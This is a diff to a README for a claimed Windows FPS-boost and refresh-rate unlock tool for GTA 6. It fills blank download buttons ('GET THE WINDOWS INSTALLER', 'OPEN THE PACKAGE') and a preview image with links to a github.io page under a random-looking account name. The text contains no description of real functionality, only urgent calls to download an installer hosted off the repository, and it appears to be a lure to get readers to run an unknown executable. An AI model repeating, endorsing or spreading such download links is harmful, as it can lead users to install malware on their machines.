@@ -6,7 +6,7 @@ A performance preset tool — is a Windows desktop app that sets the frame budge
 
 # 📥 **INSTALLER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS INSTALLER**]( )
+## [⬇️ **GET THE WINDOWS INSTALLER**](https://fntpjrekcqqs.github.io/GTA-6-FPS-Boost-Optimizer-Hz-Unlock-Tool/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A performance preset tool — is a Windows desktop app that sets the frame budge
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt="preview image">
+<img src="https://github.com/fntpjrekcqqs/GTA-6-FPS-Boost-Optimizer-Hz-Unlock-Tool/blob/main/gta6fps.jfif?raw=true" width="1280" height="720" alt="preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://fntpjrekcqqs.github.io/GTA-6-FPS-Boost-Optimizer-Hz-Unlock-Tool/)
 
 ---
 
